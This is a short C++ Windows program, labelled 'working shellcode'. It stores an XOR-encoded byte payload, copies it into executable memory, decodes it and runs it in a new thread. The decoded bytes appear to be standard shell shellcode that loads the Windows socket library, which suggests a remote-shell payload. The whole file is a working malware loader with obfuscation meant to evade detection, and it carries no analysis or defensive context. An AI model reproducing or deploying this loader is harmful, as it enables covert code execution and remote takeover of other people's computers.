// working shellcode

#include <Windows.h>
#include <iostream>
#include <algorithm>


using namespace std;


void main()
{
	const char shellcode[] = "\xc9\xdd\xb7\x35\x35\x35\x55\xbc\xd0\x4\xf5\x51\xbe\x65\x5\xbe\x67\x39\xbe\x67\x21\xbe\x47\x1d\x3a\x82\x7f\x13\x4\xca\x99\x9\x54\x49\x37\x19\x15\xf4\xfa\x38\x34\xf2\xd7\xc7\x67\x62\xbe\x67\x25\xbe\x7f\x9\xbe\x79\x24\x4d\xd6\x7d\x34\xe4\x64\xbe\x6c\x15\x34\xe6\xbe\x7c\x2d\xd6\xf\x7c\xbe\x1\xbe\x34\xe3\x4\xca\x99\xf4\xfa\x38\x34\xf2\xd\xd5\x40\xc3\x36\x48\xcd\xe\x48\x11\x40\xd1\x6d\xbe\x6d\x11\x34\xe6\x53\xbe\x39\x7e\xbe\x6d\x29\x34\xe6\xbe\x31\xbe\x34\xe5\xbc\x71\x11\x11\x6e\x6e\x54\x6c\x6f\x64\xca\xd5\x6a\x6a\x6f\xbe\x27\xde\xb8\x68\x5d\x6\x7\x35\x35\x5d\x42\x46\x7\x6a\x61\x5d\x79\x42\x13\x32\xca\xe0\x8d\xa5\x34\x35\x35\x1c\xf1\x61\x65\x5d\x1c\xb5\x5e\x35\xca\xe0\x65\x65\x65\x65\x75\x65\x75\x65\x5d\xdf\x3a\xea\xd5\xca\xe0\xa2\x5f\x30\x5d\x3f\x3f\x33\xe8\x5d\x37\x35\x24\x69\xbc\xd3\x5f\x25\x63\x62\x5d\xac\x90\x41\x54\xca\xe0\xb0\xf5\x41\x39\xca\x7b\x3d\x40\xd9\x5d\xc5\x80\x97\x63\xca\xe0\x5d\x56\x58\x51\x35\xbc\xd6\x62\x62\x62\x4\xc3\x5f\x27\x6c\x63\xd7\xc8\x53\xf2\x71\x11\x9\x34\x34\xb8\x71\x11\x25\xf3\x35\x71\x61\x65\x63\x63\x63\x73\x63\x7b\x63\x63\x66\x63\x5d\x4c\xf9\xa\xb3\xca\xe0\xbc\xd5\x7b\x63\x73\xca\x5\x5d\x3d\xb2\x28\x55\xca\xe0\x8e\xc5\x80\x97\x63\x5d\x93\xa0\x88\xa8\xca\xe0\x9\x33\x49\x3f\xb5\xce\xd5\x40\x30\x8e\x72\x26\x47\x5a\x5f\x35\x66\xca\xe0";
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	for (int i = 0; i < sizeof shellcode; i++)
	{
		((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) ^ '\x35';
	}
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}